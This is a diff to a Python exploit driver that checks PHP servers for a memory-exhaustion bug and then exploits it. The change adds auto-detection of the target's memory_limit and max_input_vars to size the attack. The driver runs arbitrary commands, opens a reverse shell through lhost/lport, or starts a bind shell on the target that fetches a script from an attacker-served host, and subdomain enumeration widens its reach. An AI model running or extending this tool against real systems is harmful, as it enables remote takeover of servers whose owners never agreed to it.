@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import argparse
+import math
 import os
 import ssl
 import sys
@@ -157,8 +158,11 @@ parser.add_argument(
 parser.add_argument(
     "--huge-mb",
     type=int,
-    default=12,
-    help="Size of the OOM field in MiB; must exceed the target's memory_limit (default: 12)",
+    help=(
+        "Size of the OOM field in MiB; must exceed the target's "
+        "memory_limit (default: auto-detected from the target's OOM fatal, "
+        "else 12)"
+    ),
 )
 
 
@@ -249,15 +253,116 @@ def enumerate_subdomains(domain):
     return subdomains.enumerate_subdomains(domain)
 
 
-def is_vulnerable(target):
-    """True only when the memory-exhaustion behavior was observed."""
+def verify_target(target):
+    """Deep-verify the vulnerability; returns the scan result dict.
+
+    Deep probing escalates body sizes so targets whose memory_limit is above
+    the template's 20 MiB still show the OOM fatal, and captures the
+    target's memory_limit / max_input_vars so the exploit can adapt.
+    """
+    import math
+
     for attempt in range(2):
-        res = scan.check_url(target)
+        res = scan.check_url(target, deep=True)
         if res["result"] != scan.UNKNOWN:
             print(scan.finding_line(res))
-            return res["result"] == scan.MEMORY_EXHAUSTION
+            if res["memory_limit"]:
+                print("Target memory_limit: %d bytes (%d MiB)"
+                      % (res["memory_limit"],
+                         res["memory_limit"] // (1024 * 1024)))
+            if res["max_input_vars"]:
+                print("Target max_input_vars: %d" % res["max_input_vars"])
+            return res
         print("Scan attempt %d inconclusive; retrying..." % (attempt + 1))
-    return False
+    return None
+
+
+def run_exploit(args):
+    """Verify the vulnerability on the single --target, then exploit it."""
+    import exploit
+
+    if len(args.target) != 1:
+        parser.error("--exploit requires exactly one --target")
+    if args.domain or args.subdomain:
+        parser.error("--exploit cannot be combined with --domain/--subdomain")
+
+    target = args.target[0]
+    res = verify_target(target)
+    if res is None or res["result"] != scan.MEMORY_EXHAUSTION:
+        if res is not None and res["result"] in (scan.VERSION_VULNERABLE,
+                                                 scan.VERSION_EOL):
+            print("The target reports a vulnerable PHP version but the OOM "
+                  "fatal could not be triggered (memory_limit above "
+                  "post_max_size, or display_errors=Off); the exploit chain "
+                  "needs the OOM to corrupt session state, so it will not "
+                  "run against this target.")
+        else:
+            print("Vulnerability not verified on " + target
+                  + "; not exploiting.")
+        return 1
+
+    print("Vulnerability verified; starting exploit against " + target)
+
+    # Adapt to the target's ini settings.
+    if args.huge_mb is not None:
+        huge_mb = args.huge_mb
+    elif res["memory_limit"]:
+        huge_mb = int(math.ceil(res["memory_limit"] / (1024 * 1024.0))) + 4
+        print("Auto-sizing the OOM field to %d MiB (target memory_limit %d MiB)"
+              % (huge_mb, res["memory_limit"] // (1024 * 1024)))
+    else:
+        huge_mb = 12
+    max_vars = res["max_input_vars"] or 1000
+    if max_vars > 1000:
+        print("Target max_input_vars is %d; scaling the trigger request "
+              "field counts (heap calibration may be off for this setup)"
+              % max_vars)
+    if res["memory_limit"] and res["memory_limit"] > 8 * 1024 * 1024:
+        print("WARNING: target memory_limit is %d MiB; this exploit chain's "
+              "heap calibration is tied to memory_limit=8M (the official "
+              "php:8.4-apache lab profile). The leak stages are unlikely to "
+              "succeed on this configuration."
+              % (res["memory_limit"] // (1024 * 1024)))
+
+    kwargs = dict(
+        profile=args.profile,
+        zif_offset=args.zif_offset,
+        dtor_offset=args.dtor_offset,
+        htdata_offset=args.htdata_offset,
+        huge_mb=huge_mb,
+        retries=args.retries,
+        max_vars=max_vars,
+    )
+    if args.command:
+        if len(args.command.encode()) > exploit.MAX_CMD:
+            print(
+                "--command is limited to " + str(exploit.MAX_CMD)
+                + " bytes by the forged carrier."
+            )
+            return 1
+        ok = exploit.exploit_command(target, args.command, **kwargs)
+    elif args.bind_port is not None:
+        # Bind mode explicitly selected: the shell listens on the target
+        # (--bind-port, default 4444); the script fetch is served from
+        # serve-host/serve-port (auto-detected when omitted).
+        serve_port = args.serve_port or args.lport
+        if serve_port is not None and not args.no_serve \
+                and not (1 <= serve_port <= 65535):
+            parser.error("--serve-port must be a valid TCP port")
+        ok = exploit.exploit_bind(
+            target, args.bind_port,
+            serve_host=args.serve_host or args.lhost, serve_port=serve_port,
+            serve=not args.no_serve, **kwargs,
+        )
+    elif args.lhost:
+        ok = exploit.exploit_shell(target, args.lhost, args.lport, **kwargs)
+    else:
+        # Plain --exploit: zero-setup bind shell. The script-fetch address is
+        # auto-detected (loopback targets via their own 0.0.0.0; remote
+        # targets via a short form of our source IP on port 80 when it fits).
+        ok = exploit.exploit_bind(target, bind_port=None, serve_host=None,
+                                  serve_port=None, **kwargs)
+    return 0 if ok else 1
 
 
 def run_scan(targets, log_path=None):
@@ -299,61 +404,6 @@ def run_scan(targets, log_path=None):
     print("Done: " + str(findings) + " finding(s) across "
           + str(len(targets)) + " target(s).")
     return 0
-
-def run_exploit(args):
-    """Verify the vulnerability on the single --target, then exploit it."""
-    import exploit
-
-    if len(args.target) != 1:
-        parser.error("--exploit requires exactly one --target")
-    if args.domain or args.subdomain:
-        parser.error("--exploit cannot be combined with --domain/--subdomain")
-
-    target = args.target[0]
-    if not is_vulnerable(target):
-        print("Vulnerability not verified on " + target + "; not exploiting.")
-        return 1
-
-    print("Vulnerability verified; starting exploit against " + target)
-    kwargs = dict(
-        profile=args.profile,
-        zif_offset=args.zif_offset,
-        dtor_offset=args.dtor_offset,
-        htdata_offset=args.htdata_offset,
-        huge_mb=args.huge_mb,
-        retries=args.retries,
-    )
-    if args.command:
-        if len(args.command.encode()) > exploit.MAX_CMD:
-            print(
-                "--command is limited to " + str(exploit.MAX_CMD)
-                + " bytes by the forged carrier."
-            )
-            return 1
-        ok = exploit.exploit_command(target, args.command, **kwargs)
-    elif args.bind_port is not None:
-        # Bind mode explicitly selected: the shell listens on the target
-        # (--bind-port, default 4444); the script fetch is served from
-        # serve-host/serve-port (auto-detected when omitted).
-        serve_port = args.serve_port or args.lport
-        if serve_port is not None and not args.no_serve \
-                and not (1 <= serve_port <= 65535):
-            parser.error("--serve-port must be a valid TCP port")
-        ok = exploit.exploit_bind(
-            target, args.bind_port,
-            serve_host=args.serve_host or args.lhost, serve_port=serve_port,
-            serve=not args.no_serve, **kwargs,
-        )
-    elif args.lhost:
-        ok = exploit.exploit_shell(target, args.lhost, args.lport, **kwargs)
-    else:
-        # Plain --exploit: zero-setup bind shell. The script-fetch address is
-        # auto-detected (loopback targets via their own 0.0.0.0; remote
-        # targets via a short form of our source IP on port 80 when it fits).
-        ok = exploit.exploit_bind(target, bind_port=None, serve_host=None,
-                                  serve_port=None, **kwargs)
-    return 0 if ok else 1
-
 
 def main():
     args = parser.parse_args()
